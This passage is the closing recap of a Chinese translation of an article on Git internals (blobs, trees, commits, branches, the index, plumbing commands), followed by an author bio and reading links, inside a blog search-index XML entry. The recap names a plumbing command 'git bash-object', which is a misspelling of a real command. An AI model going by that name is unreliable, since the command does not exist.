的内部原理，我们一开始讲了基本对象——<strong>blob</strong>、<strong>树对象</strong> 和 <strong>提交对象</strong> 。</p><p>我们了解到 <strong>blob</strong> 持有文件的内容，<strong>树对象</strong> 是一个包含 <strong>blob 对象</strong> 和 <strong>子树对象</strong> 的目录列表，<strong>提交对象</strong> 是工作目录的一个快照，包含了一些像时间或提交信息这样的元数据。</p><p>我们接着讨论了 <strong>分支</strong>，它们不过是 <strong>提交对象</strong> 的命名引用。</p><p>我们继续描述了 <strong>工作目录</strong>，它是一个目录，有着相应的仓库。<strong>暂存区（索引）</strong> 为下一个 <strong>提交对象</strong> 持有对应的 <strong>树对象</strong>，而仓库就是一个 <strong>提交对象</strong> 的集合。</p><p>我们阐明了这些术语与 <code>git init</code>、<code>git add</code> 和 <code>git commit</code> 之间的关系，我们用这几条著名的命令创建新仓库、提交文件。</p><p>然后，我们大胆地深入 <code>git</code> 内部，停止使用上层命令，转而使用底层命令。</p><p>借助 <code>echo</code> 和 <code>git bash-object</code> 这类的底层命令，我们创建了 <strong>blob</strong>，把它添加到 <strong>索引</strong>，创建了 <strong>索引</strong> 的 <strong>树对象</strong>，以及指向这个 <strong>树对象</strong> 的 <strong>提交对象</strong>。</p><p>我们还创建了 <strong>分支</strong>，在 <strong>分支</strong> 间来回切换。为你们中那些亲身尝试这个过程的人鼓个掌！👏</p><p>希望你在跟着本文操作一遍之后，对使用 <code>git</code> 过程中背后发生的事情有了更深入的理解。</p><p><strong>感谢阅读本文！</strong> 如果你喜欢这篇文章，你可以在 <a href="http://swimm.io/">swimm.io blog</a> 阅读更多这个主题的内容。</p><p>_<a href="https://www.linkedin.com/in/omer-rosenbaum-034a08b9/">Omer Rosenbaum</a> 是 <a href="https://swimm.io/">Swimm</a> 的首席技术官、网络培训专家、Checkpoint 安全学院的创始人和<a href="https://data.cyber.org.il/networks/networks.pdf">计算机网络（希伯来语）</a>的作者_。</p><p>访问我的 _<a href="https://www.youtube.com/watch?v=79jlgESHzKQ&list=PL9lx0DXCC4BMS7dB7vsrKI5wzFyVIk2Kg">YouTube 频道</a>_。</p><hr><h1 id="附加资源"><a href="#附加资源" class="headerlink" title="附加资源"></a>附加资源</h1><p><code>git</code> 相关的资源已经有的很多了，我发现下面这些参考特别有用：</p><ul><li><a href="https://www.youtube.com/playlist?list=PL9lx0DXCC4BNUby5H58y6s2TQVLadV8v7">Git Internals YouTube playlist — by Brief</a></li><li><a href="https://www.youtube.com/watch?v=MYP56QJpDr4">Tim Berglund’s lecture — “Git From the Bits Up”</a></li><li><a href="https://jwiegley.github.io/git-from-the-bottom-up/">Git from the Bottom Up — by John Wiegley</a></li><li><a href="http://www.gelato.unsw.edu.au/archives/git/0512/13748.html">as promised, docs: git for the confused</a></li><li><a href="https://git-scm.com/book/en/v2/Git-Internals-Git-Objects">Git Internals — Git Objects — from Pro Git book, by Scott Chacon and Ben Straub</a></li></ul><p>原文：<a href="https://www.freecodecamp.org/news/git-internals-objects-branches-create-repo/">A Visual Guide to Git Internals — Objects, Branches, and How to Create a Repo From Scratch</a>，作者：<a href="https://www.freecodecamp.org/news/author/omer/">Omer Rosenbaum</a></p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git对象</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
